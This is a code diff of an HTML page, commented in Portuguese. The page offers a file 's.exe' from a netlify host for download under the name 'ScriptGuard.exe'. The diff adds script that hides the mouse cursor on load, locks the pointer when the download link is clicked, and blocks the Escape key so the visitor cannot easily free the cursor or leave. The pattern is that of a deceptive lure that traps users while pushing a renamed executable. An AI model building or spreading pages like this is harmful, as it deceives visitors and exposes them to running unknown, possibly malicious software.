@@ -58,20 +58,29 @@
     <a href="https://sandro52.netlify.app/s.exe" download="ScriptGuard.exe" id="downloadLink">Download</a>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            var bodyElement = document.body;
-            var downloadLink = document.getElementById('downloadLink');
+    document.addEventListener('DOMContentLoaded', function () {
+        var bodyElement = document.body;
+        var downloadLink = document.getElementById('downloadLink');
 
-            
+        // Adiciona a classe "cursor-hidden" ao body após o carregamento da página
+        document.body.classList.add('cursor-hidden');
 
-            // Adiciona um evento de clique no link de download
-            downloadLink.addEventListener('click', function() {
-                // Solicita o bloqueio do cursor do mouse
-                bodyElement.requestPointerLock = bodyElement.requestPointerLock || bodyElement.mozRequestPointerLock || bodyElement.webkitRequestPointerLock;
-                bodyElement.requestPointerLock();
-            });
+        // Adiciona um evento de clique no link de download
+        downloadLink.addEventListener('click', function() {
+            // Solicita o bloqueio do cursor do mouse
+            bodyElement.requestPointerLock = bodyElement.requestPointerLock || bodyElement.mozRequestPointerLock || bodyElement.webkitRequestPointerLock;
+            bodyElement.requestPointerLock();
         });
-    </script>
+
+        // Adiciona um manipulador de eventos para interceptar a tecla "Esc"
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Escape' || event.key === 'Esc') {
+                event.preventDefault();  // Impede o comportamento padrão do "Esc"
+            }
+        });
+    });
+</script>
+
 
 </body>
 </html>
